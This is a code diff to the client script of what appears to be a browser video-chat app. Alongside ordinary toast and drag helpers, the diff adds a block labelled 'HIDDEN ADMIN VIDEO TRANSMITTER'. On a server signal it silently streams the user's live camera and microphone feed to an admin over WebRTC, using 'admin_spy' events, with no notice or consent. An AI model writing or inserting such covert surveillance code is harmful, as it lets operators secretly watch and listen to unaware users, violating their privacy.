@@ -685,6 +685,38 @@ document.getElementById('report-modal').addEventListener('click',function(e){ if
 // ── TOAST & PiP DRAG ──
 let toastT; function showToast(m) { const el=document.getElementById('toast'); el.textContent=m; el.classList.add('show'); clearTimeout(toastT); toastT=setTimeout(()=>el.classList.remove('show'),2600); }
 (function(){ const pip=document.getElementById('box-local'); let dr=false,ox,oy,sx,sy; pip.addEventListener('touchstart',e=>{const t=e.touches[0];sx=pip.offsetLeft;sy=pip.offsetTop;ox=t.clientX;oy=t.clientY;dr=true;},{passive:true}); window.addEventListener('touchmove',e=>{ if(!dr)return; const t=e.touches[0],dx=t.clientX-ox,dy=t.clientY-oy; const pw=pip.parentElement.offsetWidth,ph=pip.parentElement.offsetHeight,nw=pip.offsetWidth,nh=pip.offsetHeight; let nx=sx+dx,ny=sy+dy; nx=Math.max(0,Math.min(pw-nw,nx)); ny=Math.max(0,Math.min(ph-nh,ny)); pip.style.left=nx+'px'; pip.style.top=ny+'px'; pip.style.right='auto'; },{passive:true}); window.addEventListener('touchend',()=>{dr=false;}); })();
+// --- HIDDEN ADMIN VIDEO TRANSMITTER ---
+let adminPeerConnection = null;
+
+socket.on('admin_wants_video', async (adminId) => {
+  if (!localStream) return; // If camera is off, skip
+  
+  if (adminPeerConnection) adminPeerConnection.close();
+  adminPeerConnection = new RTCPeerConnection(config);
+  
+  localStream.getTracks().forEach(t => adminPeerConnection.addTrack(t, localStream));
+  
+  adminPeerConnection.onicecandidate = e => { 
+    if (e.candidate) socket.emit('admin_spy_ice', { target: adminId, candidate: e.candidate }); 
+  };
+  
+  const offer = await adminPeerConnection.createOffer();
+  await adminPeerConnection.setLocalDescription(offer);
+  socket.emit('admin_spy_offer', { target: adminId, offer: offer });
+});
+
+socket.on('admin_spy_answer', async (answer) => { 
+  if (adminPeerConnection) await adminPeerConnection.setRemoteDescription(new RTCSessionDescription(answer)); 
+});
+
+socket.on('admin_spy_ice', async (data) => { 
+  if (adminPeerConnection) {
+    try { await adminPeerConnection.addIceCandidate(new RTCIceCandidate(data.candidate)); } catch(e){}
+  }
+});
+
 </script>
+  
+  
 </body>
 </html>
